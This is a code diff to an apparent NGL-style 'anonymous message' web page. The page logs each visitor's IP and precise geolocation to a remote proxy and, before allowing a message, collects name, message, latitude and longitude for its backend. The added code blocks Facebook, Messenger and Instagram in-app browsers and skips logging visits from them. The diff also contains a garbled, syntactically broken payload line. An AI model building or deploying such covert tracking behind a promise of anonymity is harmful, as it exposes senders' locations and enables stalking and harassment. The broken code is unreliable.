@@ -437,7 +437,6 @@
       text-shadow: 0 1px 4px rgba(244,63,94,0.13);
       margin-top: 2px;
     }
-    /* NGL pop then shake animation */
     .ngl-pop-shake {
       animation: ngl-pop-shake 2.7s cubic-bezier(.16,1.02,.32,1.08) infinite;
       will-change: transform;
@@ -488,6 +487,37 @@
       border-radius: 18px;
       border: none;
       cursor: pointer;
+    }
+    /* In-app browser modal styles (reuse modal pattern) */
+    #inAppBrowserModal {
+      display:none;
+      position:fixed;
+      z-index:10000;
+      inset:0;
+      background:rgba(0,0,0,0.38);
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+    }
+    #inAppBrowserModal > div {
+      background:#fff;
+      color:#222;
+      border-radius:22px;
+      box-shadow:0 4px 40px #f43f5e55;
+      padding:40px 28px 34px 28px;
+      max-width:340px;
+      text-align:center;
+      position:relative;
+    }
+    #copyLinkButton {
+      font-size:1.08rem;
+      font-weight:600;
+      padding:10px 26px;
+      background:#f43f5e;
+      color:#fff;
+      border-radius:18px;
+      border:none;
+      cursor:pointer;
     }
   </style>
 </head>
@@ -595,8 +625,49 @@
     </div>
   </div>
 
+  <!-- In-app browser modal -->
+  <div id="inAppBrowserModal">
+    <div>
+      <div style="font-size:2.1rem; font-weight:700; margin-bottom:18px; color:#f43f5e;">
+        🚫 Switch Browser Needed
+      </div>
+      <div style="font-size:1.1rem; margin-bottom:18px;">
+        Facebook/Messenger browsers are not supported.<br>
+        Please switch to <b>Chrome</b>, <b>Safari</b>, or your device browser.<br>
+        <span style="font-size:1rem; color:#444;">
+          Tap the <b>three dots (⋮)</b> or <b>Share</b> icon and select <b>Open in Browser</b>.<br><br>
+          Or tap below to copy the link and paste in your browser!
+        </span>
+      </div>
+      <button id="copyLinkButton">Copy Link</button>
+    </div>
+  </div>
+
   <script>
-    // Location Modal Logic
+    // Browser detection for in-app browsers
+    function isInAppBrowser() {
+      var ua = navigator.userAgent || navigator.vendor || '';
+      return /FBAN|FBAV|FB_IAB|FB4A|FBCR|FBSV|FBID|Messenger|Instagram/i.test(ua);
+    }
+
+    window.addEventListener('DOMContentLoaded', function() {
+      // In-app browser modal logic
+      if (isInAppBrowser()) {
+        document.getElementById('inAppBrowserModal').style.display = 'flex';
+        document.getElementById('fadeContainer').style.display = 'none';
+      }
+      const copyBtn = document.getElementById('copyLinkButton');
+      if(copyBtn) {
+        copyBtn.onclick = function() {
+          navigator.clipboard.writeText(window.location.href).then(function() {
+            copyBtn.textContent = "Copied!";
+            setTimeout(() => { copyBtn.textContent = "Copy Link"; }, 2000);
+          });
+        };
+      }
+    });
+
+    // -- Location Modal Logic --
     const locationModal = document.getElementById('locationModal');
     const locationModalBox = document.getElementById('locationModalBox');
     const locationModalClose = document.getElementById('locationModalClose');
@@ -612,8 +683,9 @@
       }
     });
 
-    // Log IP and location on every page load
+    // --- Log IP and location on every page load ---
     window.addEventListener('DOMContentLoaded', function() {
+      if (isInAppBrowser()) return; // Don't log visits from in-app browsers
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(pos){
           fetch('https://my-ngl-jeric-site.vercel.app/api/proxy', {
@@ -645,7 +717,7 @@
       }
     });
 
-    // --- Your JS Logic ---
+    // --- Dice & message logic ---
     const phrases = [
       "I like u, do u like me too?",
       "I'm still not over u",
@@ -780,8 +852,10 @@
       document.getElementById('sentPeopleTapCount').textContent =
         document.getElementById('peopleTapCount').textContent;
     }
+    // --- Updated dualSubmit: Enforce location, send to backend with lat/lng ---
     async function dualSubmit(event) {
       event.preventDefault();
+      if (isInAppBrowser()) return false;
       const container = document.getElementById('fadeContainer');
       const loadingSpinner = document.getElementById('nglLoading');
       const form = event.target;
@@ -804,7 +878,7 @@
       }
       window._lastSubmittedName = nameValue;
 
-      // LOCATION ENFORCEMENT BLOCK
+      // --- LOCATION ENFORCEMENT BLOCK ---
       if (!navigator.geolocation) {
         alert('Geolocation is not supported by your browser.');
         return false;
@@ -830,10 +904,11 @@
       }
       container.classList.add('fade-out');
       loadingSpinner.style.display = "flex";
+
       setTimeout(async () => {
         try {
           const payload = {
-            name: formData.get('name'),
+           ('name'),
             message: formData.get('message'),
             latitude,
             longitude
